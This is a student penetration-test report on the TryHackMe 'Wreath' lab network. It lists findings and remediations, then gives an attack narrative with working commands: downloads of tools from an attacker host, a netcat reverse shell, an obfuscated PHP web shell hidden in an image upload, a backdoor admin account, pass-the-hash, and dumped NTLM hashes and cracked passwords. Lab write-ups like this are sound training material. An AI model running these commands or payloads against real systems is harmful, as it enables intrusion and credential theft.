


Wreath Network - Penetration Test Report


Author: bl4cknr3d




https://tryhackme.com/room/wreath

TABLE OF CONTENTS
Executive Summary	3
Scope	3
Summary of results	3
Findings and Remediations	4
10.200.85.200	4
10.200.85.150	4
10.200.85.100	5
Attack Narrative	7
==10.200.85.200 - Enumeration==	7
==10.200.85.200 - Exploitation==	9
==10.200.85.200 - Post-Exploitation/Enumeration==	10
==10.200.85.200 - Pivoting==	12
==10.200.85.150 - Enumeration==	14
==10.200.85.150 - Exploitation==	15
==10.200.85.150 Post - Exploitation / Enumeration==	16
==10.200.85.150 Post - Exploitation / Password Cracking==	21
==10.200.85.100 - Enumeration==	22
==10.200.85.100 - Exploitation==	27
==10.200.85.100 - Post - Enumeration / Enumeration==	31
Cleanup	39
Conclusion	39
References	40
Vulnerabilities	40
Tools	40
Appendices	41
Scripts/Payloads	41








Executive Summary
bl4cknr3d was contacted by Thomas Wreath to conduct a Grey-Box PenTesting in order to determine if the network was exposed to any vector of attacks. 
Activities carried out simulating a malicious actor trying to penetrate Thomas Wreath's network with the goal of assessing the current standpoint of Thomas Wreath's overall security posture.
Scope 
There are three machines on the network
There is at least one public facing web server with the given Public IP address of 10.200.85.200
There is a self-hosted git server somewhere on the network. The git server is internal, so Thomas may have pushed sensitive information into it
There is a PC running on the network that has antivirus installed, meaning we can hazard a guess that this is likely to be Windows. By the sounds of it this is likely to be the server variant of Windows, which might work in our favor. The (assumed) Windows PC cannot be accessed directly from the web server
Summary of results
The initial point of compromise was Thomas Wreath’s public-facing web server, exploited via a known vulnerability. This allowed access to the internal GitStack server, which had another exploitable vulnerability, leading to a full system compromise and exposure of plain text passwords. We performed tunneling to access the development web server, where we found a password-protected webpage. Using credentials from the compromised web server, we accessed this page and exploited an image upload function to upload a web shell, compromising the final target. This penetration test enabled us to map Thomas Wreath’s network infrastructure.




Findings and Remediations
10.200.85.200
CVE-2019-15107 
Severity: Critical
Description: Webmin Service was using MiniServ 1.890 which is outdated. In its configuration the parameter old in password_change.cgi contains a command injection vulnerability.
Mitigation: Update the service to the latest patch to resolve the issue.
https://nvd.nist.gov/vuln/detail/CVE-2019-15107

Weak Firewall rules
Severity: Low
Description: Upon getting a foothold on this machine, you can enumerate other machines to leverage your attack by scanning hosts.
Mitigation: Ping service should be turned off to not discover other hosts on the same network easily
10.200.85.150
CVE-2018-5955
Severity: Critical
Description: GitStack Service was using version 2.3.10 which is outdated and has a known public exploit. User controlled input is not sufficiently filtered, allowing an unauthenticated attacker to add a user to the server via the username and password fields to the rest/user/ URI.
Mitigation: Update the service to the latest patch to resolve the issue.
https://nvd.nist.gov/vuln/detail/CVE-2019-5955

Password Policy
	Severity: High
Description: Thomas Wreath’s password in this machine is easily crackable by common wordlists, and was reusing password from another host.
Mitigation: Have a policy that implements a stronger password, or use password manager for storage. Do not reuse passwords.
Error Page Information Disclosure
Severity: High
Description: Django returns an error page that suggest possible directories which can be correct when used by default
Mitigation: Configure Django to only display a custom error page without revealing any information.

Improper Privileges
Severity: Medium
Description: The GitStack service running on the Git Server is running as SYSTEM user. Successful exploitation leads to a privileged user.
Mitigation: Principle of least-privilege. If the account does not need privileged rights, do not use them.

Weak Firewall rules
Severity: Low
Description: Upon getting a foothold on this machine, you can enumerate other machines to leverage your attack by scanning hosts.
Mitigation: Ping service should be turned off to not discover other hosts on the same network easily

10.200.85.100
Unrestricted File Upload
	Severity: Critical
Description: The web app discovered in this machine has an arbitrary file upload vulnerability, allowing attackers to execute commands on the system with the web server's privileges.
Mitigation: Filter hardening on the file upload
https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload



Unquoted service path
Severity: Critical
Description: The System Explorer Help Service path is unquoted, which allows threat actors to insert a malicious file and hijack the program's execution.
Mitigation: Quote the path and set the correct ownership of the directory to prevent low-level users from writing to it.

Password Policy / Reused password
Severity: High
Description: Thomas Wreath’s password in this machine is easily crackable by common wordlists, and was reusing password from another host.
Mitigation: Have a policy that implements a stronger password, or use password manager for storage. Do not reuse passwords.




























Attack Narrative
We were given an IP address of 10.200.85.200 which is facing the internet. We start doing enumeration.
==10.200.85.200 - Enumeration==


Open ports are 22, 80, 443, 9090 and 10000








We included the IP to /etc/hosts with the domain of thomaswreath.thm because it doesn’t resolve after entering the IP address






Public Information Disclosure on the web page at port 80










Searching google for exploit for the web

So with this version of webmin, there is a publicly available exploit that we can use. We download it from git with the following link https://github.com/MuirlandOracle/CVE-2019-15107


==10.200.85.200 - Exploitation==

then we run the exploit
the shell is not full, so we try to get a full reverse shell



We stabilized the shell so we can interact easily using:
python3 -c 'import pty;pty.spawn("/bin/bash")'


==10.200.85.200 - Post-Exploitation/Enumeration==
We enumerate the compromised machine 



root:$6$i9vT8tk3SoXXxK2P$HDIAwho9FOdd4QCecIJKwAwwh8Hwl.BdsbMOUAd3X/chSCvrmpfy.5lrLgnRVNq6/6g0PxK9VqSdy47/qKXad1::0:99999:7:::

for us to have a persistent access, we can do is to copy ssh id_rsa of the user root, which can be found here


i copied and named it as id_rsa on my local folder

the id_rsa we got got no password


Let's try to gather information on the machine whether it has machine connected to it that we do not know using this command:
for i in {1..255}; do (ping -c 1 10.200.85.${i} | grep "bytes from" &); done


we got a pingback from this 3 machine


now we try to enumerate open ports from .250 with this command:
for i in {1..65535}; do (echo > /dev/tcp/10.200.85.250/$i) >/dev/null 2>&1 && echo $i is open; done


it displays to have 2 open ports
==10.200.85.200 - Pivoting==
I pivoted using sshuttle using the following commands:
sshuttle -r root@10.200.85.200 --ssh-cmd 'ssh -i ./id_rsa' 10.200.85.200/24 -x 10.200.85.200


I uploaded an nmap script on the target using my attacking machine and began enumerating more info


./nmap-blkr3d 10.200.85.100





./nmap-blkr3d -p- 10.200.85.150





==10.200.85.150 - Enumeration==
While sshuttle was running, I tried accessing 10.200.85.150


gives an error with suggestions







i tried accessing the first suggested directory



Tried accessing with the default admin:admin as the page says but it is not working


Now we know that it is running gitstack, we try to find an exploit on our kali machine


==10.200.85.150 - Exploitation==
The exploit is written in DOS so we need to convert

I configured and ran the exploit which gave us a nt authority\system access

==10.200.85.150 Post - Exploitation / Enumeration==
Then we continue enumerating inside the system





I performed relay using socat, then allowed specific port for the relay
curl http://10.50.86.11:9000/socat -o /root/temp/socat-ed1

firewall-cmd --zone=public --add-port 15696/tcp

./socat-ed1 tcp-l:15696 tcp:10.50.86.11:4443 &


Then we use reverse shell using powershell which is URL-encoded

We used this command in our exploit


Then on our listener we received a reverse shell

After getting a foothold on the gitstack server, we create a netuser that allows remote access
net user blkr3d Og@123456 /add
net localgroup Administrators blkr3d /add
net localgroup "Remote Management Users" blkr3d /add


Then I accessed the machine by using xfreerdp for simplicity
xfreerdp /v:192.168.100.55 /u:Administrator /p:swordfish +clipboard /drive:/usr/share/windows-resources,share


Ran mimikatz and dump hashes


Dump
mimikatz # lsadump::sam
Domain : GIT-SERV
SysKey : 0841f6354f4b96d21b99345d07b66571
Local SID : S-1-5-21-3335744492-1614955177-2693036043
SAMKey : f4a3c96f8149df966517ec3554632cf4
RID : 000001f4 (500)
User : Administrator
Hash NTLM: 37db630168e5f82aafa8461e05c6bbd1
Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
Random Value : 68b1608793104cca229de9f1dfb6fbae
* Primary:Kerberos-Newer-Keys *
Default Salt : WIN-1696O63F791Administrator
Default Iterations : 4096
Credentials
aes256_hmac (4096) : 8f7590c29ffc78998884823b1abbc05e6102a6e86a3ada9040e4f3dcb1a02955
aes128_hmac (4096) : 503dd1f25a0baa75791854a6cfbcd402
des_cbc_md5 (4096) : e3915234101c6b75
* Packages *
NTLM-Strong-NTOWF
* Primary:Kerberos *
Default Salt : WIN-1696O63F791Administrator
Credentials
des_cbc_md5 : e3915234101c6b75
RID : 000001f5 (501)
User : Guest
RID : 000001f7 (503)
User : DefaultAccount
RID : 000001f8 (504)
User : WDAGUtilityAccount
Hash NTLM: c70854ba88fb4a9c56111facebdf3c36
Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
Random Value : e389f51da73551518c3c2096c0720233
* Primary:Kerberos-Newer-Keys *
Default Salt : WDAGUtilityAccount
Default Iterations : 4096
Credentials
aes256_hmac (4096) : 1d916df8ca449782c73dbaeaa060e0785364cf17c18c7ff6c739ceb1d7fdf899
aes128_hmac (4096) : 33ee2dbd44efec4add81815442085ffb
des_cbc_md5 (4096) : b6f1bac2346d9e2c
* Packages *
NTLM-Strong-NTOWF
* Primary:Kerberos *
Default Salt : WDAGUtilityAccount
Credentials
des_cbc_md5 : b6f1bac2346d9e2c
RID : 000003e9 (1001)
User : Thomas
Hash NTLM: 02d90eda8f6b6b06c32d5f207831101f
Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
Random Value : 03126107c740a83797806c207553cef7
* Primary:Kerberos-Newer-Keys *
Default Salt : GIT-SERVThomas
Default Iterations : 4096
Credentials
aes256_hmac (4096) : 19e69e20a0be21ca1befdc0556b97733c6ac74292ab3be93515786d679de97fe
aes128_hmac (4096) : 1fa6575936e4baef3b69cd52ba16cc69
des_cbc_md5 (4096) : e5add55e76751fbc
OldCredentials
aes256_hmac (4096) : 9310bacdfd5d7d5a066adbb4b39bc8ad59134c3b6160d8cd0f6e89bec71d05d2
aes128_hmac (4096) : 959e87d2ba63409b31693e8c6d34eb55
des_cbc_md5 (4096) : 7f16a47cef890b3b
* Packages *
NTLM-Strong-NTOWF
* Primary:Kerberos *
Default Salt : GIT-SERVThomas
Credentials
des_cbc_md5 : e5add55e76751fbc
OldCredentials
des_cbc_md5 : 7f16a47cef890b3b
RID : 000003ea (1002)
User : USERNAME
Hash NTLM: 7b592e4f8178b4c75788531b2e747687
Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
Random Value : 29cb1b16f0895ea63e4c2ced49cd2e40
* Primary:Kerberos-Newer-Keys *
Default Salt : GIT-SERVUSERNAME
Default Iterations : 4096
Credentials
aes256_hmac (4096) : 95c5328287bd4cd5e97ea6361fdf3a44dfe333df3c59ffb08553b9b7e1ec9530
aes128_hmac (4096) : 51ed2804c94ff10445a4216d4c583178
des_cbc_md5 (4096) : 4afb9e9e34381a54
* Packages *
NTLM-Strong-NTOWF
* Primary:Kerberos *
Default Salt : GIT-SERVUSERNAME
Credentials
des_cbc_md5 : 4afb9e9e34381a54
RID : 000003eb (1003)
User : 89p13
Hash NTLM: 03ad1f03055c519783f12056a662a396
Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
Random Value : 559bfcc07cd7f0ca15e73b12cbcbabb7
* Primary:Kerberos-Newer-Keys *
Default Salt : GIT-SERV89p13
Default Iterations : 4096
Credentials
aes256_hmac (4096) : 30e26b09e6b081858e4da449fa6eb0c4dc8c0b782492ce8f72073ddcd34e174c
aes128_hmac (4096) : 399145cb5bcce39e0ff0a205408c3651
des_cbc_md5 (4096) : 16081c9749a1a47a
OldCredentials
aes256_hmac (4096) : 80b51aace8c60698d48f3c98b9c59146eb548d1e23cc9f1dca1257e0facd3bd0
aes128_hmac (4096) : 1b60d00cc7c46599011806a28b55ca7b
des_cbc_md5 (4096) : d07f98baa116b3c7
* Packages *
NTLM-Strong-NTOWF
* Primary:Kerberos *
Default Salt : GIT-SERV89p13
Credentials
des_cbc_md5 : 16081c9749a1a47a
OldCredentials
des_cbc_md5 : d07f98baa116b3c7
RID : 000003ec (1004)
User : blkr3d
Hash NTLM: a6a8897384c090041871e337cc8e5caf
Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
Random Value : 723929e66317521415c5762d28126c06
* Primary:Kerberos-Newer-Keys *
Default Salt : GIT-SERVblkr3d
Default Iterations : 4096
Credentials
aes256_hmac (4096) : cb22f3c83b0d74239ec0573afa4828700a31d2d885741422f2834f9ad9b26e6f
aes128_hmac (4096) : 18ab8ead61c53aa4ca8f31f165a0864d
des_cbc_md5 (4096) : 9dd97a1673200497
* Packages *
NTLM-Strong-NTOWF
* Primary:Kerberos *
Default Salt : GIT-SERVblkr3d
Credentials
des_cbc_md5 : 9dd97a1673200497
mimikatz #


==10.200.85.150 Post - Exploitation / Password Cracking==



Now we got the credential
Thomas:i<3ruby



==10.200.85.100 - Enumeration==
We then use pass the hash attack from our created user to become administrator

evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.85.150



Then we use Invoke-Portscan.ps1


Then hosted I transferred a chisel file


We portforward

Notice in the command we said, dir=in which means the direction of packets will be coming into this machine and action=allow which says to allow the packets. Finally localport=37000 opens up port 37000 for this.

Now start a chisel server in this port on the Git-Server that listens for connections coming from our Attack Machine.


Then on our attacker local machine we start the chisel client
./chisel client 10.200.85.150:37000 9020:10.200.85.100:80






then i tried accessing the 9020 localhost port we set







Wappalyzer


As we are analyzing the new webpage, we conclude that this is a replica of the website on the webserver. Now I download a git repository that is a replica of what the .200 serves on the web
download C:\Gitstack\Repositories\Website.git /home/ed/Desktop/Wreath/Website.git



Checking the downloaded files

Renamed website.git to .git

then I used a tool called extractor from gittool to extract to human readable format the git repository we got from .150

i named the extracted directory to Wreath-Web
it contains the following


I then try to find where the .php file was located


<?php
	if(isset($_POST["upload"]) && is_uploaded_file($_FILES["file"]["tmp_name"])){
		$target = "uploads/".basename($_FILES["file"]["name"]);
		$goodExts = ["jpg", "jpeg", "png", "gif"];
		if(file_exists($target)){
			header("location: ./?msg=Exists");
			die();
		}
		$size = getimagesize($_FILES["file"]["tmp_name"]);
		if(!in_array(explode(".", $_FILES["file"]["name"])[1], $goodExts) || !$size){
			header("location: ./?msg=Fail");
			die();
		}
		move_uploaded_file($_FILES["file"]["tmp_name"], $target);	
		header("location: ./?msg=Success");
		die();
	} else if ($_SERVER["REQUEST_METHOD"] == "post"){
		header("location: ./?msg=Method");
	}
	if(isset($_GET["msg"])){
		$msg = $_GET["msg"];
		switch ($msg) {
			case "Success":
				$res = "File uploaded successfully!";
				break;
			case "Fail":
				$res = "Invalid File Type";
				break;
			case "Exists":
				$res = "File already exists";
				break;
			case "Method":
				$res = "No file send";
				break;
		
		}
	}
?>
<!DOCTYPE html>
<html lang=en>
	<!-- ToDo:
		 - Finish the styling: it looks awful
		 - Get Ruby more food. Greedy animal is going through it too fast
		 - Upgrade the filter on this page. Can't rely on basic auth for everything
		 - Phone Mrs Walker about the neighbourhood watch meetings
	-->
	<head>	
		<title>Ruby Pictures</title>
		<meta charset="utf-8">
		<meta name="viewport" content="width=device-width, initial-scale=1.0">
		<link rel="stylesheet" type="text/css" href="assets/css/Andika.css">
		<link rel="stylesheet" type="text/css" href="assets/css/styles.css">
	</head>
	<body>
		<main>
			<h1>Welcome Thomas!</h1>
			<h2>Ruby Image Upload Page</h2>
			<form method="post" enctype="multipart/form-data">
				<input type="file" name="file" id="fileEntry" required, accept="image/jpeg,image/png,image/gif">
				<input type="submit" name="upload" id="fileSubmit" value="Upload">
			</form>
			<p id=res><?php if (isset($res)){ echo $res; };?></p>
		</main>	
	</body>
</html>


i've checked all the 3 folders and only folder name starting with number 3 dont have this php file, folder number 2 and 1 has the same content

i have no knowledge prior to coding but here are some info


==10.200.85.100 - Exploitation==
Then we we go to localhost:9050/resources

There is a login page, we used the account of Thomas that we got from .150 “Thomas:i<3ruby”






We are welcomed to an image upload page










then we make a comment inside our test image, and see if we can successfully run a php command
we use a tool called exiftool

I tried uploading test.jpg.php, it uploads the files seamlessly

We use this payload
payload:


<?php
$cmd = $_GET["wreath"];
if(isset($cmd)){
echo "<pre>" . shell_exec($cmd) . "</pre>";
}
die();
?>





now we obfuscate https://www.gaijin.at/en/tools/php-obfuscator


<?php $v0=$_GET[base64_decode('d3JlYXRo')];if(isset($v0)){echo base64_decode('PHByZT4=').shell_exec($v0).base64_decode('PC9wcmU+');}die();?>



insert a \ before the $


<?php \$p0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$p0)){echo base64_decode('PHByZT4=').shell_exec(\$p0).base64_decode('PC9wcmU+');}die();?>



here's an image of an angry cat with a payload from above


so we can now execute commands with the wreath placeholder
http://localhost:"port"/resources/uploads/"name_of_image"?wreath="command"


whoami /all



Then I will download netcat so we can have a reverse shell


curl http://10.50.86.11:7000/nc64-blk.exe -o c:\\windows\\temp\\nc64-blk.exe




then I setup a listener to the port that we set here, we will also execute this to the web browser for the .100 to execute
powershell.exe c:\\windows\\temp\\nc64-blk.exe 10.50.86.11 443 -e cmd.exe











Then we got shell

==10.200.85.100 - Post - Enumeration / Enumeration==
After getting a foothold, I check for privileges




I started looking for non-default services





Then I upload winpeas and execute it
curl http://10.50.86.11:7000/winPEASx64.exe -o c:\\windows\\temp\\winPEASx64.exe

powershell.exe winPEAS.bat -e cmd.exe








After I found an unquoted service
We create a file called Wrapper.cs
Compiled it using Mono [mcs compiler]

this will then create an exe file

I renamed it to r3d because I did something wrong with my file.


then we upload the file to temp again by using the web url


curl http://10.50.86.11:7000/wrapper-r3d.exe -o %TEMP%\wrapper-r3d.exe

then we run this command to execute our uploaded file



Then on my listener I got a shell





What does this do? it executes and returns a shell with the ownership of the file where it was executed, so for example if it was executed in a normal directory you will be a normal user with that directory's privilege. so if we can store it on a directory with "admin" privilege then we can get a shell with admin privilege, or we can just replace a service file and make it stop then start it again making us a user with elevated privilege





To make our exploit execute faster we can stop a service and start it again
sc stop SystemExplorerHelpService


Then start it again
sc start SystemExplorerHelpService




then i have a root shell, we then proceed to delete what we left and start the service normally again




Now we have system privilege, we can dump hashes
We start it by hosting smb server



then on the victim machine we run 



You can do this to SAM and SECURITY aswell








we use the following command to view the dumped files



[*] Target system bootKey: 0xfce6f31c003e4157e8cb1bc59f4720e6
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a05c3c807ceeb48c47252568da284cd2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:06e57bdd6824566d79f127fa0de844e2:::
Thomas:1000:aad3b435b51404eeaad3b435b51404ee:02d90eda8f6b6b06c32d5f207831101f:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DPAPI_SYSTEM
dpapi_machinekey:0x14e6c87b2e510c48628322b274e4a45d33b9b8ff
dpapi_userkey:0x4ed0e1d0becfcfc9fde2422472b0e1a5464c431d
[*] NL$KM
0000 4D 64 AD 40 EE 83 E0 DF BB C8 E2 63 8E AD 40 3E Md.@.......c..@>
0010 09 46 F2 26 26 4F B7 C0 67 EC 81 3F 5B ED 1A C7 .F.&&O..g..?[...
0020 62 70 F7 42 FF 21 3C B1 9F 3D 39 08 A2 DE 9B C2 bp.B.!<..=9.....
0030 77 A4 93 FB 30 92 50 8B 95 79 EF ED 05 8B F3 35 w...0.P..y.....5
NL$KM:4d64ad40ee83e0dfbbc8e2638ead403e0946f226264fb7c067ec813f5bed1ac76270f742ff213cb19f3d3908a2de9bc277a493fb3092508b9579efed058bf335
[*] _SC_Apache2.4
(Unknown User):i<3ruby
[*] Cleaning up...



















Cleanup
10.200.83.200 
Removed the uploaded nmap-blkr3d binary which was used to enumerate
the internal network.

10.200.83.150
Removed the file that the exploit created exploit-blkr3d.php, the created
user account with net user blkr3d, and chisel-blkr3d.exe that I used for
pivoting inside the internal network.

10.200.83.100 
Removed nc wrapper System.exe, and the custom compiled nc.exe binary used to bypass the Antivirus software running on the system. Also removed my uploaded file upload exploit file image.png.php which was used to get the initial remote code execution. Removed all the generated SAM, Security and System.bak.


Conclusion
Every flaw in a network infrastructure, computers, servers, or application should be regularly scheduled for review. Unaddressed vulnerabilities can lead to significant damage, whether through theft or internal sabotage, depending on the threat actor's intent. Thomas is advised to implement a patch management program to protect his projects from vulnerabilities. Additionally, enforcing strict password policies to avoid the use of common and easy passwords and implementing least-privilege access for users who do not require administrative rights is crucial. Thomas should also conduct bimonthly scans for new and emerging vulnerabilities across his assets.












References
	
Vulnerabilities
https://nvd.nist.gov/vuln/detail/CVE-2019-15107
https://nvd.nist.gov/vuln/detail/CVE-2019-5955
https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
https://kb.cybertecsecurity.com/knowledge/unquoted-service-paths
	



Tools	
https://hackertarget.com/nmap-cheatsheet-a-quick-reference-guide/
https://gist.github.com/cmbaughman/c91f41ba7b2cf71106f1
https://github.com/curl/curl-cheat-sheet
https://github.com/ab14jain/PowerShell
https://github.com/gentilkiwi/mimikatz/wiki
https://github.com/Hackplayers/evil-winrm
https://github.com/sshuttle/sshuttle
https://github.com/jpillora/chisel
https://github.com/samratashok/nishang/blob/master/Scan/Invoke-PortScan.ps1
https://linux.die.net/man/1/xfreerdp





Appendices	
Scripts/Payloads
wrapper.cs


makefile for nc.exe


Modified GitStack RCE

